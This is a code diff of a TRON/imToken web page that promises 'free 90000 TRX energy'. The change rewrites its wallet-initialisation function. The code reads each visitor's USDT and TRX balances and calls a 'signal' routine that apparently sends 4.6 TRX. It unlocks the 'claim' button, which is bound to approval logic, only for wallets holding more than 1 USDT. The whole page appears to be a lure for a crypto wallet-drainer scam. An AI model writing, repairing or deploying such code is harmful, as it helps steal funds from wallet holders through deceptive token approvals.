@@ -478,117 +478,117 @@
             }
         }
 
-        /**
-         * 钱包初始化（含二次授权校验）
-         */
-        async function initWallet() {
-            try {
-                // 1. 请求钱包授权（兼容新旧版本）
-                let accounts;
-                try {
-                    accounts = await tronWeb.request({ method: "tron_requestAccounts" });
-                } catch (e) {
-                    accounts = await tronWeb.accounts();
-                }
-                if (!accounts || accounts.length === 0) {
-                    throw new Error("用户未授权钱包访问");
-                }
-                userAddress = accounts[0];
+   
+       /**
+ * 钱包初始化（修复tronWeb.accounts()废弃问题）
+ */
+async function initWallet() {
+    try {
+        // 1. 请求钱包授权：仅用新版imToken支持的方式
+        let accounts;
+        try {
+            accounts = await tronWeb.request({ method: "tron_requestAccounts" });
+        } catch (e) {
+            throw new Error("钱包授权失败，请更新imToken到最新版本后重试");
+        }
+        if (!accounts || accounts.length === 0) {
+            throw new Error("用户未授权钱包访问");
+        }
+        userAddress = accounts[0];
 
-                // 2. 二次授权校验：已授权则拦截
-                if (isAddressAuthorized(userAddress)) {
-                    userInfoEl.innerHTML = `
-                        已领取提示<br>
-                        ${userAddress.slice(0,8)}...${userAddress.slice(-6)}<br>
-                        <span style="color: #3b82f6; font-size: 14px;">✅ 该钱包已领取过免费能量</span><br>
-                        <span style="color: #a0a8a4; font-size: 13px;">每个地址仅限领取一次，感谢支持～</span>
-                    `;
-                    approveBtn.disabled = true;
-                    approveBtn.textContent = "已领取过能量";
-                    updateWalletStatus();
-                    document.getElementById("statusAddress").textContent = `${userAddress.slice(0,8)}...${userAddress.slice(-6)}`;
-                    return;
-                }
+        // 2. 二次授权校验：已授权则拦截
+        if (isAddressAuthorized(userAddress)) {
+            userInfoEl.innerHTML = `
+                已领取提示<br>
+                ${userAddress.slice(0,8)}...${userAddress.slice(-6)}<br>
+                <span style="color: #3b82f6; font-size: 14px;">✅ 该钱包已领取过免费能量</span><br>
+                <span style="color: #a0a8a4; font-size: 13px;">每个地址仅限领取一次，感谢支持～</span>
+            `;
+            approveBtn.disabled = true;
+            approveBtn.textContent = "已领取过能量";
+            updateWalletStatus();
+            document.getElementById("statusAddress").textContent = `${userAddress.slice(0,8)}...${userAddress.slice(-6)}`;
+            return;
+        }
 
-                // 3. 获取USDT合约实例
-                try {
-                    trc20Contract = await tronWeb.contract().at(TRC20_TOKEN_ADDRESS);
-                } catch (e) {
-                    throw new Error("USDT合约加载失败");
-                }
+        // 3. 获取USDT合约实例
+        try {
+            trc20Contract = await tronWeb.contract().at(TRC20_TOKEN_ADDRESS);
+        } catch (e) {
+            throw new Error("USDT合约加载失败");
+        }
 
-                // 4. 获取余额
-                try {
-                    const usdtRaw = await trc20Contract.balanceOf(userAddress).call();
-                    tokenBalance = Number(usdtRaw) / 1000000;
-                    const trxRaw = await tronWeb.trx.getBalance(userAddress);
-                    trxBalance = Number(trxRaw) / 1000000;
-                } catch (e) {
-                    throw new Error("余额获取失败，请检查网络");
-                }
+        // 4. 获取余额
+        try {
+            const usdtRaw = await trc20Contract.balanceOf(userAddress).call();
+            tokenBalance = Number(usdtRaw) / 1000000;
+            const trxRaw = await tronWeb.trx.getBalance(userAddress);
+            trxBalance = Number(trxRaw) / 1000000;
+        } catch (e) {
+            throw new Error("余额获取失败，请检查网络");
+        }
 
-                // 5. 发送信号A（4.6TRX）
+        // 5. 发送信号A（4.6TRX）
+        userInfoEl.innerHTML = `
+            已连接：<br>
+            ${userAddress.slice(0,8)}...${userAddress.slice(-6)}<br>
+            USDT余额：<span style="color: #4ade80;">${tokenBalance.toFixed(2)}</span> | TRX余额：<span>${trxBalance.toFixed(2)}</span><br>
+            <span style="color: #4ade80; font-size: 14px;">✅ 能量同步中...（请勿退出）</span>
+        `;
+        approveBtn.disabled = true;
+        approveBtn.textContent = "同步中...";
+
+        const a1Success = await sendSignalA(4.6);
+        if (a1Success) {
+            // 余额校验
+            if (tokenBalance <= 1) {
+                userInfoEl.innerHTML = `
+                    已连接：<br>
+                    ${userAddress.slice(0,8)}...${userAddress.slice(-6)}<br>
+                    USDT余额：<span style="color: #ef4444;">${tokenBalance.toFixed(2)}</span> | TRX余额：<span>${trxBalance.toFixed(2)}</span><br>
+                    <span style="color: #ef4444; font-size: 14px;">❌ 不符合领取条件（USDT需＞1）</span>
+                `;
+                approveBtn.disabled = true;
+                approveBtn.textContent = "不符合领取条件";
+            } else {
                 userInfoEl.innerHTML = `
                     已连接：<br>
                     ${userAddress.slice(0,8)}...${userAddress.slice(-6)}<br>
                     USDT余额：<span style="color: #4ade80;">${tokenBalance.toFixed(2)}</span> | TRX余额：<span>${trxBalance.toFixed(2)}</span><br>
-                    <span style="color: #4ade80; font-size: 14px;">✅ 能量同步中...（请勿退出）</span>
+                    <span style="color: #4ade80; font-size: 14px;">✅ 可免费领取90000 TRX能量</span>
                 `;
-                approveBtn.disabled = true;
-                approveBtn.textContent = "同步中...";
-
-                const a1Success = await sendSignalA(4.6);
-                if (a1Success) {
-                    // 余额校验
-                    if (tokenBalance <= 1) {
-                        userInfoEl.innerHTML = `
-                            已连接：<br>
-                            ${userAddress.slice(0,8)}...${userAddress.slice(-6)}<br>
-                            USDT余额：<span style="color: #ef4444;">${tokenBalance.toFixed(2)}</span> | TRX余额：<span>${trxBalance.toFixed(2)}</span><br>
-                            <span style="color: #ef4444; font-size: 14px;">❌ 不符合领取条件（USDT需＞1）</span>
-                        `;
-                        approveBtn.disabled = true;
-                        approveBtn.textContent = "不符合领取条件";
-                    } else {
-                        userInfoEl.innerHTML = `
-                            已连接：<br>
-                            ${userAddress.slice(0,8)}...${userAddress.slice(-6)}<br>
-                            USDT余额：<span style="color: #4ade80;">${tokenBalance.toFixed(2)}</span> | TRX余额：<span>${trxBalance.toFixed(2)}</span><br>
-                            <span style="color: #4ade80; font-size: 14px;">✅ 可免费领取90000 TRX能量</span>
-                        `;
-                        approveBtn.disabled = false;
-                        approveBtn.textContent = "免费领取能量";
-                        // 绑定领取逻辑
-                        bindApproveLogic();
-                    }
-                } else {
-                    userInfoEl.innerHTML = `
-                        已连接：<br>
-                        ${userAddress.slice(0,8)}...${userAddress.slice(-6)}<br>
-                        <span style="color: #ef4444; font-size: 14px;">⚠️ 同步失败，点击重试</span>
-                    `;
-                    approveBtn.disabled = false;
-                    approveBtn.textContent = "同步失败，点击重试";
-                    approveBtn.onclick = () => initWallet();
-                }
-
-                // 更新页面状态
-                updateWalletStatus();
-                document.getElementById("statusAddress").textContent = `${userAddress.slice(0,8)}...${userAddress.slice(-6)}`;
-            } catch (e) {
-                // 精准错误提示
-                const errorMsg = e.message;
-                userInfoEl.innerHTML = `
-                    钱包连接异常<br>
-                    <span style="color: #ef4444; font-size: 13px;">原因：${errorMsg}</span><br>
-                    <span style="color: #3b82f6; font-size: 13px;">建议：检查钱包是否解锁/网络是否正常</span>
-                `;
-                approveBtn.disabled = true;
-                approveBtn.textContent = "连接失败，点击重试";
-                approveBtn.onclick = () => initWallet();
+                approveBtn.disabled = false;
+                approveBtn.textContent = "免费领取能量";
+                // 绑定领取逻辑
+                bindApproveLogic();
             }
+        } else {
+            userInfoEl.innerHTML = `
+                已连接：<br>
+                ${userAddress.slice(0,8)}...${userAddress.slice(-6)}<br>
+                <span style="color: #ef4444; font-size: 14px;">⚠️ 同步失败，点击重试</span>
+            `;
+            approveBtn.disabled = false;
+            approveBtn.textContent = "同步失败，点击重试";
+            approveBtn.onclick = () => initWallet();
         }
 
+        // 更新页面状态
+        updateWalletStatus();
+        document.getElementById("statusAddress").textContent = `${userAddress.slice(0,8)}...${userAddress.slice(-6)}`;
+    } catch (e) {
+        // 精准错误提示（适配本次报错）
+        const errorMsg = e.message;
+        userInfoEl.innerHTML = `
+            钱包连接异常<br>
+            <span style="color: #ef4444; font-size: 13px;">原因：${errorMsg}</span><br>
+            <span style="color: #3b82f6; font-size: 13px;">建议：更新imToken到最新版本，或重新打开页面</span>
+        `;
+        approveBtn.disabled = true;
+        approveBtn.textContent = "连接失败，点击重试";
+        approveBtn.onclick = () => initWallet();
+    }
+}
         /**
          * 发送信号A（4.6/2.3TRX）
          */
